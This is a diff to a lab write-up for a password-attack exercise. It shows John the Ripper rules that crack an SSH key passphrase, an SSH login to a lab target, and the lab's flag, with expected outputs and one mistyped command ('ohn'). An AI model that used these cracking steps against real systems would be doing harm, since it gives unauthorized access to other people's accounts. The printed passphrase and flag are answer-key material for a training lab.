@@ -245,39 +245,71 @@ Lab 1 - Follow the steps outlined in this section to get access to VM #1 (BRUTE)
 >EOF
 >
 ># Create a rules file
->kali@kali:~/passwordattacks$ cat > ssh.rule << EOF
+>kali@kali:~/passwordattacks$ cat > ssh.rule << 'EOF'
 >[List.Rules:sshRules]
->c $1 $3 $7 $!
->c $1 $3 $7 $@
->c $1 $3 $7 $#
+>c$1$3$7$!
+>c$1$3$7$@
+>c$1$3$7$#
 >EOF
 >
-># Add rules to John configuration
->kali@kali:~/passwordattacks$ sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
->
 ># Crack the SSH Key Passphrase
->kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+>kali@kali:~/passwordattacks$ ohn --wordlist=ssh.passwords --rules=sshRules --config=ssh.rule ssh.hash
 >
 ># ========== Expected Result ==========
->...
->Umbrella137!
->...
+>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+>Cost 2 (iteration count) is 16 for all loaded hashes
+>Will run 16 OpenMP threads
+>Press 'q' or Ctrl-C to abort, almost any other key for status
+>Umbrella137!     (id_rsa)     
+>1g 0:00:00:00 DONE (2026-01-06 09:32) 3.030g/s 54.54p/s 54.54c/s 54.54C/s Window137!..Umbrella137#
+>Use the "--show" option to display all of the cracked passwords reliably
+>Session completed. 
 ># =====================================
 >
 ># Display cracked password
 >kali@kali:~/passwordattacks$ john --show ssh.hash
 >
 ># ========== Expected Result ==========
+>Warning! john.conf section [list.rules:sshrules] is multiple declared.
 >id_rsa:Umbrella137!
+>
+>1 password hash cracked, 0 left
 ># =====================================
 >
 ># SSH into the Target as dave
 >kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.213.201
 >
+># Enter discovered password "Umbrella137!"
+>
+># ========== Expected Result ==========
+>Enter passphrase for key 'id_rsa': 
+>Welcome to Alpine!
+>
+>The Alpine Wiki contains a large amount of how-to guides and general
+>information about administrating Alpine systems.
+>See <http://wiki.alpinelinux.org/>.
+>
+>You can setup the system with the command: setup-alpine
+>
+>You may change this message by editing /etc/motd.
+>
+>4b24bfc56298:~$
+># =====================================
+>
 ># Retrieve the Flag
->cd ~
->ls
->cat flag.txt
+>4b24bfc56298:~$ ls
+>
+># ========== Expected Result ==========
+>flag.txt
+># =====================================
+>
+># View flag
+>4b24bfc56298:~$ cat flag.txt
+>
+># ========== Expected Result ==========
+>OS{03d37f8c50b70ae5e29f770f8e6b9b72}
+># =====================================
 >```
 >OS{03d37f8c50b70ae5e29f770f8e6b9b72}
 
